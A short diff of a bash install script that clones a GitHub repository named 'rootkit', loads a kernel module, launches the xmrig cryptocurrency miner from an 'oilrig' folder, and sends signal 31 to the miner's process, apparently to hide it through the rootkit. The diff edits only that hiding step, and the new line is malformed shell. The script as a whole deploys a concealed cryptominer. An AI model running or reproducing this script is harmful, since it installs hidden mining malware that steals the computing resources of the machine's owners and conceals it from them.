@@ -1,5 +1,6 @@
 #!/bin/bash
 
+
 echo " starting install root "
 echo " cloning "
 git clone https://github.com/VYOM00907/rootkit
@@ -24,7 +25,7 @@ dmesg
 echo "done loading module"
 cd oilrig 
 ./xmrig 
-
-pidof xmrig | kill -31 
+pid $(pidof xmrig)
+kill -31 $pid 
 
 echo "done launching "
